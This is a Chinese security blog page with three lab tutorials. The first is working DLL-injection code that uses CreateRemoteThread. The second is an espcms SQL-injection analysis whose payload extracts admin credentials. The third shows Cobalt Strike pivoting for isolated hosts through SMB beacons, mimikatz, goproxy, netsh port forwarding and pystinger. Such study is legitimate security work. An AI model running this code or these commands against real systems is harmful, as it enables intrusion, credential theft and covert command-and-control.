<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;Dll Injected&quot;</span>), _T(<span class="string">&quot;tips&quot;</span>), MB_OK);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>注入代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Tlhelp32.h.&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">//提升权限代码</span></span><br><span class="line"><span class="function">BOOL <span class="title">AdjustProcessTokenPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID luidTmp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = luidTmp;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="keyword">char</span>* szDllPathName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// #0.提升进程为DEBUG权限</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustProcessTokenPrivilege())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;提权失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取进程句柄</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OPENPROCESS Error ! \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//在目标进程分配内存并写入dll路径名</span></span><br><span class="line">    LPVOID lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VIRTUALALLOCEX Error !  \n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BOOL bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Error ! \n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取LoadLibraryA 函数地址</span></span><br><span class="line">    FARPROC dwLoadAddr = GetProcAddress(GetModuleHandle(_T(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!dwLoadAddr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error !\n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建远程线程,加载dll</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hThread)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreatRemoteTread Error !\n&quot;</span>);</span><br><span class="line">        GetLastError();</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LoadDll(<span class="number">25028</span>, (<span class="keyword">char</span>*)<span class="string">&quot;C:\\Users\\Administrator\\source\\repos\\Project8\\Project8\\DllTest.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>选择PID为25028的进程进行注入</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6018fc43f194b200017364cc"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/3aab9a86-5a38-46cd-8dff-81bf3eb4b27f.png" alt="imgbed.cn图床"></a></p>
<p>注入成功，弹出MessageBox</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6018fc39bd63390001d215f7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fcf08c29-2e1c-4d1f-982d-4fbf3c7e8d27.png" alt="imgbed.cn图床"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-06T02:59:04.806Z" title="2021-01-06T02:59:04.806Z">2021-01-06</time>发表</span><span class="level-item"><time dateTime="2021-01-06T03:16:50.215Z" title="2021-01-06T03:16:50.215Z">2021-01-06</time>更新</span><span class="level-item">7 分钟读完 (大约983个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/06/espcms%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"> </a></h1><div class="content"><h1 id="espcms前台注入分析"><a href="#espcms前台注入分析" class="headerlink" title="espcms前台注入分析"></a>espcms前台注入分析</h1><p>《代码审计 企业级Web代码安全架构》一书中出现的cms，14年的老版本出现的Insert型注入。漏洞位于前台提交订单处</p>
<p>/interface/order.php</p>
<p>$ptitle和$tsn为可控变量，通过accept方法获取参数</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/237c2f01-4c8d-4c6b-874a-5944d082746b.png" alt="imgbed.cn图床"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ptitle</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;ptitle&#x27;</span>, <span class="string">&#x27;P&#x27;</span>);</span><br><span class="line"><span class="variable">$tsn</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;tsn&#x27;</span>, <span class="string">&#x27;P&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>/public/class_function.php处找到accept函数的定义，从$_GET和$_POST数组中获取内容，并使用daddslashes函数过滤。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/6fc076c5-a329-4950-8ccd-7c96f566fc5e.png" alt="imgbed.cn图床"></a></p>
<p>查看daddslashes函数声明，首先判断gpc是否开启，未开启则开启gpc，当$string为数组或为字符串时，调用addslashes对函数进行过滤并返回过滤后的$string</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/1fb0abb5-0da8-4d05-921c-99aca0eb0f9f.png" alt="imgbed.cn图床"></a></p>
<p>第373行拼接并执行了sql语句，可控变量$tsn和$ptitle未经过任何过滤就拼接到了sql语句中,这个 $tsn 和 $did $ptitle 都是可控的变量,相当于 $_POST[XXX] ，$tsn 不为数组时取值就会变成 $tsn{x}的方式 ，$temp =  “abc”$temp[0]的值为a。$tsn参数提交一个’，经过daddslashes转义后自动添加\变成\‘，取$tsn[0]为,可以利用这个来达到绕过转义的限制，来达到注入的目的。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/910c1ace-b39b-4993-b983-d076984e6b45.png" alt="imgbed.cn图床"></a></p>
<p>正常请求的数据包，可以看到默认传递$ptitle[]和$tsn[]，%5B%5D为url编码后的[]</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/espcms/index.php?ac=order&amp;at=ordersave</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 541</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost/espcms/index.php?ac=order&amp;at=orderpay</span><br><span class="line"><span class="attribute">Cookie</span>: cookieconsent_status=dismiss; Phpstorm-8e4b56ac=beb94186-86bf-4a9d-832a-863045cf4b2f; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1609381035; bdshare_firstime=1609381035017; Kffm_2132_saltkey=BgX15Dcg; Kffm_2132_lastvisit=1609472159; LankeMobile=p; ecisp_home_seccode=VneCeoRkPaRoYm1deaqUnow; ecisp_member_username=qtXCmg; ecisp_member_info=Z-LdZrRltZqompSolXLIpZqioo-c1J7eamZkZp2RbGxnbLVnZ2ZlaGKXbGxsspOclmObnm1nnJ6YaJtpb3Bnl2ZtYZTFb56abcJryJLGtJZkaJ2Wm51ka5yXmGhslGKRcJ9ybJObmpSWmW2TbseZ; PHPSESSID=fdcbb78c3f2f1dbfa3f269460137e63b; ecisp_order_list=l6CScLOnc2xvWJ5naFScmXNrcNysn2ScWpmamoicn3JmcHSocGlvU5POp66nqoN0zmuTc7Ku; ecisp_order_productmoney=aZiRZg; ecisp_order_sncode=aZ7CbZlpb25lm2lnamjDaXFpmZlxy2eXcWdlbpzHmJ4</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">userid=1&amp;productmoney=3200&amp;discount_productmoney=3200&amp;discountmoney=0&amp;tokenkey=85e30790ab01309cf9ba7c2cc40f03f8&amp;ptitle%5B%5D=HTC+Flyer+%E5%B9%B3%E6%9D%BF%E7%94%B5%E8%84%91&amp;tsn%5B%5D=SN20110830222536894&amp;bprice%5B%5D=3200.00&amp;oprice%5B%5D=3600.00&amp;did%5B%5D=27&amp;amount%5B%5D=1&amp;countprice%5B%5D=3200.00&amp;alias=rrr&amp;sex=0&amp;email=asdasd%40gmail.com&amp;tel=eeee&amp;mobile=eeee&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=eee&amp;zipcode=0&amp;sendtime=1&amp;osid=1&amp;opid=1&amp;content=&amp;invpayee=&amp;invcontent=&amp;submit=%E7%A1%AE%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%AE%A2%E5%8D%95</span><br></pre></td></tr></table></figure>

<p>正常提交执行的sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> espcms_order_info (<span class="keyword">oid</span>,did,tsn,title,oprice,bprice,countprice,amount,inventory) <span class="keyword">VALUES</span> (<span class="number">12</span>,<span class="number">26</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;HTC S510e&#x27;</span>,<span class="number">3200</span>,<span class="number">3100</span>,<span class="number">3100</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<p>$tsn去掉[]后提交 \</p>
<p>$ptitle[]提交   ,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#</p>
<p>​    $tsn与$ptitle均有单引号包裹，拼接到sql语句中$tsn与$ptitle默认被当作数组处理，当$tsn为字符串时,尝试提交$tsn内容为‘，经过accept函数处理，daddslashes函数转义后$tsn为\‘并拼接到sql语句中，原本包裹$tsn的后一个引号被转义，$tsn的前一个引号与$ptitle的前一个引号闭合，相当于$tsn实际内容为’\‘,’</p>
<p>​    </p>
<p>注入执行的sql语句如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> espcms_order_info (<span class="keyword">oid</span>,did,tsn,title,oprice,bprice,countprice,amount,inventory) <span class="keyword">VALUES</span> (<span class="number">12</span>,<span class="number">36</span>,<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#&#x27;</span>,<span class="number">3200</span>,<span class="number">3100</span>,<span class="number">3100</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>





<p>在提交订单时候用burpsuite抓包并修改</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/279c51e5-cce6-43af-8bf6-7bdbd3654518.png" alt="imgbed.cn图床"></a></p>
<p>利用成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/b58a6081-ec88-46de-a77d-ae0e72568c2a.png" alt="imgbed.cn图床"></a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/25828/">https://www.uedbox.com/post/25828/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-94423">https://www.seebug.org/vuldb/ssvid-94423</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-12-15T12:21:00.000Z" title="2020-12-15T12:21:00.000Z">2020-12-15</time>发表</span><span class="level-item"><time dateTime="2020-12-15T13:23:09.994Z" title="2020-12-15T13:23:09.994Z">2020-12-15</time>更新</span><span class="level-item">8 分钟读完 (大约1226个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/">不出网主机上线方法</a></h1><div class="content"><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>假设192.168.111.0/24为公网ip段，192.168.204.0/24为内网ip段</p>
<h3 id="web服务器-Windows-2008-r2"><a href="#web服务器-Windows-2008-r2" class="headerlink" title="web服务器 Windows 2008 r2"></a>web服务器 Windows 2008 r2</h3><p>DMZ主机 虚拟机两块网卡一块设置为NAT模式，一块设置为HOSTONLY模式，可通外网 </p>
<p>公网ip:192.168.111.132</p>
<p>内网ip:192.168.204.188</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d5ebe3b7-283f-40c7-9681-573846cfeb2b.png"></p>
<h3 id="内网主机-Windows-2012"><a href="#内网主机-Windows-2012" class="headerlink" title="内网主机 Windows 2012"></a>内网主机 Windows 2012</h3><p>虚拟机网卡设置HOSTONLY模式，不通外网</p>
<p>内网ip:192.168.204.141</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/59f84afe-29df-4463-ba3c-77a61d7c924e.png"></p>
<h3 id="C2：-Kali-Linux"><a href="#C2：-Kali-Linux" class="headerlink" title="C2： Kali Linux"></a>C2： Kali Linux</h3><p>公网ip：192.168.111.129</p>
<h2 id="1-SMB-beacon"><a href="#1-SMB-beacon" class="headerlink" title="1.SMB beacon"></a>1.SMB beacon</h2><p>​    SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p>
<p>​    首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/19eb81a2-f005-4078-a051-448004d9796b.png"></p>
<h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p> 1.具有 SMB Beacon 的主机必须接受 445 端口上的连接。<br> 2.只能链接由同一个 Cobalt Strike 实例管理的 Beacon。<br> 3.利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</p>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>web服务器上线cs，run mimikatz抓取密码</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/cfc1a2fb-2f6c-4213-801c-2560692d1918.png"></p>
<p>建立listener，选择SMB beacon</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f690ca9d-1589-4adc-9a13-67a0f79896a0.png"></p>
<p>在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator ，即拥有目标主机管理员权限</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a1bb87d1-7d21-42c2-89c7-45e7c1dc52a5.png"></p>
<p>连接成功，可以看到smb beacon上线的主机右侧有∞∞标识</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/70176bc3-c391-4a74-99a0-e46e61488cac.png"></p>
<h2 id="2-配置listener通过HTTP代理上线"><a href="#2-配置listener通过HTTP代理上线" class="headerlink" title="2.配置listener通过HTTP代理上线"></a>2.配置listener通过HTTP代理上线</h2><h3 id="使用goproxy搭建代理"><a href="#使用goproxy搭建代理" class="headerlink" title="使用goproxy搭建代理"></a>使用goproxy搭建代理</h3><p><a target="_blank" rel="noopener" href="https://github.com/snail007/goproxy/releases">goproxy</a></p>
<p>上传proxy.exe到web服务器，在8080端口开启http代理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon</span><br></pre></td></tr></table></figure>

<p>用netsh命令把外网ip的8080端口转发到内网ip的192.168.204.188的822端口(必须为未使用的端口，否则会失败),web服务器的80端口被占用，不能使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh interface portproxy add v4tov4 listenaddress&#x3D;192.168.204.188 listenport&#x3D;822 connectaddress&#x3D;192.168.111.132 connectport&#x3D;8080</span><br></pre></td></tr></table></figure>

<p>检测端口是否启用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr :822</span><br></pre></td></tr></table></figure>

<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c3fae3ca-b808-4541-89f6-086887028ae4.png"></p>
<h3 id="创建listener"><a href="#创建listener" class="headerlink" title="创建listener"></a>创建listener</h3><p>设置如下</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/362076f2-3cf5-469c-96ef-7b5c2b759f30.png"></p>
<h3 id="生成stageless-payload"><a href="#生成stageless-payload" class="headerlink" title="生成stageless payload"></a>生成stageless payload</h3><p>关于stage 和 stageless的区别：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/187312.html">探寻Metasploit Payload模式背后的秘密</a></p>
<p>stager分阶段，第一阶段申请内存，第二件阶段向C2发起请求并接受shellcode执行</p>
<p>stageless不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f2d77176-06a3-438e-9cd0-2a926b8239c2.png"></a></p>
<p>成功上线</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/43ac908f-2d4f-40db-b2d5-8f3307a1a167.png"></a></p>
<p>连接过程</p>
<p><code>192.168.204.141</code>  → <code>192.168.204.188:822</code>→ <code>192.168.111.132:8080</code>→ <code>C2</code></p>
<h2 id="3-使用pystinger搭建socks4代理"><a href="#3-使用pystinger搭建socks4代理" class="headerlink" title="3.使用pystinger搭建socks4代理"></a>3.使用pystinger搭建socks4代理</h2><p><a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger">pystinger</a></p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>来源:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w">红队攻防实践：不出网主机搭建内网隧道新思路</a></p>
<p>服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/53d52a9c-c154-4f08-b84d-f87e8f129ea0.png"></a></p>
<h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><p>上传proxy.php到网站目录，正常访问返回<code>UTF-8</code></p>
<p>上传stinger_server.exe，执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start stinger_server.exe 0.0.0.0</span><br></pre></td></tr></table></figure>

